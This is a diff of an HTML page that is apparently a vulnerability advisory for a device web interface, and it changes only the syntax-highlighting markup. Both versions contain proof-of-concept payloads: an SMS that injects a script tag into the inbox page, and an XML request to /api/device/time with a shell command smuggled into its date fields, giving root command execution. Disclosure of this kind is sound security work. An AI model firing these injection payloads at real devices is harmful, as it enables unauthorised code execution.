@@ -116,7 +116,7 @@ The vendor has been notified on the 2013/03/18.</p>
 HTML tags in incoming SMS before displaying them in the UI.<br>
 But a&nbsp;specifically&nbsp;crafted SMS can bypass this flawed
 function and inject HTML tags in SMS inbox page:<br></p>
-<div class="highlight"><pre><span></span><span class="nt">&lt;/Content&gt;&lt;Index&gt;</span>0&#39;/&gt;<span class="cp">&lt;![CDATA[&lt;script type=&quot;text/javascript&quot;&gt;alert(1);&lt;/script&gt;&lt;input type=&quot;checkbox&quot; id=&#39;x]]&gt;</span><span class="nt">&lt;/Index&gt;&lt;Content&gt;</span>Coucou, tu veux voir ma balise ?
+<div class="highlight"><pre><span></span><span class="p">&lt;/</span><span class="nt">Content</span><span class="p">&gt;&lt;</span><span class="nt">Index</span><span class="p">&gt;</span>0&#39;/&gt;<span class="cp">&lt;![CDATA[&lt;script type=&quot;text/javascript&quot;&gt;alert(1);&lt;/script&gt;&lt;input type=&quot;checkbox&quot; id=&#39;x]]&gt;</span><span class="p">&lt;/</span><span class="nt">Index</span><span class="p">&gt;&lt;</span><span class="nt">Content</span><span class="p">&gt;</span>Coucou, tu veux voir ma balise ?
 </pre></div>
 
 
@@ -128,7 +128,7 @@ incoming SMS.</p>
 <p>The HTTP endpoint "/api/device/time" in WebUI is vulnerable to
 shell command injection. This allows code execution with root
 privileges.<br></p>
-<div class="highlight"><pre><span></span>javascript:saveAjaxData(&quot;api/device/time&quot;,&quot;<span class="cp">&lt;?xml ?&gt;</span><span class="nt">&lt;request&gt;&lt;Month&gt;</span>;mkdir <span class="nt">&lt;/Month&gt;&lt;Day&gt;</span>/tmp/A #<span class="nt">&lt;/Day&gt;&lt;Hour&gt;&lt;/Hour&gt;&lt;Min&gt;&lt;/Min&gt;&lt;Year&gt;&lt;/Year&gt;&lt;Sec&gt;&lt;/Sec&gt;&lt;/request&gt;</span>&quot;);
+<div class="highlight"><pre><span></span>javascript:saveAjaxData(&quot;api/device/time&quot;,&quot;<span class="cp">&lt;?xml ?&gt;</span><span class="p">&lt;</span><span class="nt">request</span><span class="p">&gt;&lt;</span><span class="nt">Month</span><span class="p">&gt;</span>;mkdir <span class="p">&lt;/</span><span class="nt">Month</span><span class="p">&gt;&lt;</span><span class="nt">Day</span><span class="p">&gt;</span>/tmp/A #<span class="p">&lt;/</span><span class="nt">Day</span><span class="p">&gt;&lt;</span><span class="nt">Hour</span><span class="p">&gt;&lt;/</span><span class="nt">Hour</span><span class="p">&gt;&lt;</span><span class="nt">Min</span><span class="p">&gt;&lt;/</span><span class="nt">Min</span><span class="p">&gt;&lt;</span><span class="nt">Year</span><span class="p">&gt;&lt;/</span><span class="nt">Year</span><span class="p">&gt;&lt;</span><span class="nt">Sec</span><span class="p">&gt;&lt;/</span><span class="nt">Sec</span><span class="p">&gt;&lt;/</span><span class="nt">request</span><span class="p">&gt;</span>&quot;);
 </pre></div>
 
 
